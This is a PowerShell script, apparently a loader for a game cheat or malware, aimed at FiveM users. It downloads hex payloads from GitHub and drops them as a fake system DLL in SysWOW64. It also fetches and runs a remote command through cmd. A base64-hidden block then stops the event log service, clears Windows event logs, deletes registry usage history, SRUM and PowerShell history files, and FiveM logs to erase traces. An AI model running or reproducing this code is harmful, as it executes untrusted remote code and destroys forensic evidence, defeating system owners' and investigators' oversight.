$ErrorActionPreference = 'SilentlyContinue'
cls
Add-Type -AssemblyName System.Windows.Forms
$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"

function HexToBytes {
    param([string]$hexStr)
    $cleanHex = [regex]::Replace($hexStr, '[^0-9A-Fa-f]', '')
    if ($cleanHex.Length % 2 -ne 0) {
        return $null
    }
    $byteArr = [byte[]]::new($cleanHex.Length / 2)
    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($cleanHex.Substring($i, 2), 16)
    }
    return $byteArr
}

try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 30
    $hexContent = $responseA.Content
    $bytes = HexToBytes $hexContent
    if ($bytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $bytes)
    }
} catch {}

Set-Clipboard $clipText

try {
    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 30
    $cmdToRun = $responseB.Content.Trim()
    if ($cmdToRun) {
        Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
    }
} catch {}

do {
    Start-Sleep -Seconds 2
} while (Get-Process -Name "Installer")

try {
    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
    $newHexContent = $responseC.Content
    $newBytes = HexToBytes $newHexContent
    if ($newBytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $newBytes)
    }
} catch {}

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwpjbHMKU2V0LUNsaXBib2FyZCAtVmFsdWUgIiAiCgpyZWcgZGVsZXRlICJIS0NSXExvY2FsIFNldHRpbmdzXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXFNoZWxsIiAvZiAqPiAkbnVsbApyZWcgZGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXENvbURsZzMyIiAvZiAqPiAkbnVsbApyZWcgZGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFJlY2VudERvY3MiIC9mICo+ICRudWxsCnJlZyBkZWxldGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcVXNlckFzc2lzdCIgL2YgKj4gJG51bGwKcmVnIGRlbGV0ZSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxSdW5NUlUiIC9mICo+ICRudWxsCnJlZyBkZWxldGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcQ29tcGF0aWJpbGl0eSBBc3Npc3RhbnRcU3RvcmUiIC9mICo+ICRudWxsCnJlZyBkZWxldGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcRmVhdHVyZVVzYWdlIiAvZiAqPiAkbnVsbAp0YXNra2lsbCAvZiAvaW0gZXhwbG9yZXIuZXhlICo+ICRudWxsCm5ldCBzdG9wIEV2ZW50TG9nIC95ICo+ICRudWxsCgonU2VjdXJpdHknLCAnQXBwbGljYXRpb24nLCAnU3lzdGVtJyB8IEZvckVhY2gtT2JqZWN0IHsgaWYgKEdldC1XaW5FdmVudCAtRmlsdGVySGFzaHRhYmxlIEB7TG9nTmFtZT0kXzsgRGF0YT0nKmluc3RhbGxlci5leGUqJ30gLU1heEV2ZW50cyAxIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSB7IHdldnR1dGlsIGNsICRfIH0gfQoKQ2xlYXItRG5zQ2xpZW50Q2FjaGUgLUZvcmNlClJlbW92ZS1JdGVtICJDOlxXaW5kb3dzXGFwcGNvbXBhdFxwY2FcKi50eHQiIC1Gb3JjZSAtUmVjdXJzZQpSZW1vdmUtSXRlbSAiQzpcV2luZG93c1xTeXN0ZW0zMlxzcnVcU1JVREIuZGF0IiAtRm9yY2UgLVJlY3Vyc2UKUmVtb3ZlLUl0ZW0gIiRlbnY6QXBwRGF0YVxNaWNyb3NvZnRcV2luZG93c1xQb3dlclNoZWxsXFBTUmVhZExpbmVcKi50eHQiIC1Gb3JjZSAtUmVjdXJzZQpSZW1vdmUtSXRlbSAtcGF0aCAiJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXExvY2FsXEZpdmVNXEZpdmVNLmFwcFxsb2dzXCoiIC1Gb3JjZSAtUmVjdXJzZQpSZW1vdmUtSXRlbSAtcGF0aCAiJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXExvY2FsXEZpdmVNXEZpdmVNLmFwcFxjcmFzaGVzXCoiIC1Gb3JjZSAtUmVjdXJzZQoKR2V0LUNoaWxkSXRlbSAtUGF0aCAiJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXExvY2FsXENyYXNoRHVtcHMiIC1SZWN1cnNlIC1GaWxlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAiKmluc3RhbGxlcioiIH0gfCBSZW1vdmUtSXRlbSAtRm9yY2UgLVJlY3Vyc2UKR2V0LUNoaWxkSXRlbSAtUGF0aCAiJGVudjpVU0VSUFJPRklMRVxBcHBEYXRhXExvY2FsXFRlbXAiIC1SZWN1cnNlIC1GaWxlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAiKmluc3RhbGxlcioiIH0gfCBSZW1vdmUtSXRlbSAtRm9yY2UgLVJlY3Vyc2UKClJ1bmRsbDMyLmV4ZSBhcHBoZWxwLmRsbCxTaGltRmx1c2hDYWNoZQoKU3RhcnQtUHJvY2VzcyBleHBsb3Jlci5leGUgKj4gJG51bGwKbmV0IHN0YXJ0IEV2ZW50TG9nIC95ICo+ICRudWxsCmV4aXQ="))) #secret

$historyFilePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-Content -Path $historyFilePath -Force
Clear-History -Force 
exit
